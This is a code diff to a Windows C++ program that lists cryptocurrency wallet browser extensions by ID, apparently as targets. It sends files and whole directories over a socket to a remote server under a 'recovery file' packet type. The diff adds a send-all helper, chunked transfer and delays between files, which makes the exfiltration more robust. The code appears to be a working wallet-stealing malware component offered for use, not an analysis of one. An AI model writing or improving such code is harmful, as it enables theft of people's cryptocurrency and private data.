@@ -54,6 +54,18 @@ static std::vector<WalletMetadata> target_wallets = {
     {"coinbasewallet", "hnfanknocfeofbddgcijnmhnfnkdnaad", "coinbase wallet"}
 };
 
+bool send_all(SOCKET sock, const char* data, int size) {
+    int remaining = size;
+    const char* p = data;
+    while (remaining > 0) {
+        int sent = send(sock, p, remaining, 0);
+        if (sent <= 0) return false;
+        p += sent;
+        remaining -= sent;
+    }
+    return true;
+}
+
 void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vector<uint8_t>& data) {
     if (sock == INVALID_SOCKET) return;
 
@@ -66,26 +78,26 @@ void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vec
     header.type = PACKET_TYPE_RECOVERY_FILE;
     header.size = totalSize;
 
-    std::vector<uint8_t> packet;
-    packet.resize(sizeof(PacketHeader) + totalSize);
-    memcpy(packet.data(), &header, sizeof(PacketHeader));
+    // Send header
+    if (!send_all(sock, (const char*)&header, sizeof(PacketHeader))) return;
 
-    uint8_t* ptr = packet.data() + sizeof(PacketHeader);
-    memcpy(ptr, &pathLen, sizeof(uint32_t));
-    ptr += sizeof(uint32_t);
-    memcpy(ptr, relPath.c_str(), pathLen);
-    ptr += pathLen;
+    // Send pathLen
+    if (!send_all(sock, (const char*)&pathLen, sizeof(uint32_t))) return;
+
+    // Send relPath
+    if (!send_all(sock, relPath.c_str(), (int)pathLen)) return;
+
+    // Send data in chunks
     if (dataSize > 0) {
-        memcpy(ptr, data.data(), dataSize);
-    }
-
-    int remaining = (int)packet.size();
-    const char* p = (const char*)packet.data();
-    while (remaining > 0) {
-        int sent = send(sock, p, remaining, 0);
-        if (sent <= 0) break;
-        p += sent;
-        remaining -= sent;
+        const int chunkSize = 65536; // 64KB
+        int remaining = (int)dataSize;
+        const char* p = (const char*)data.data();
+        while (remaining > 0) {
+            int toSend = (remaining > chunkSize) ? chunkSize : remaining;
+            if (!send_all(sock, p, toSend)) return;
+            p += toSend;
+            remaining -= toSend;
+        }
     }
 }
 
@@ -101,6 +113,7 @@ void send_directory_recursively(SOCKET sock, const fs::path& source_dir, const s
                 std::string rel = fs::relative(entry.path(), source_dir).string();
                 std::replace(rel.begin(), rel.end(), '\\', '/');
                 send_file_to_server(sock, server_path_prefix + "/" + rel, data);
+                Sleep(10); // Small delay to prevent network congestion
             }
         }
     }
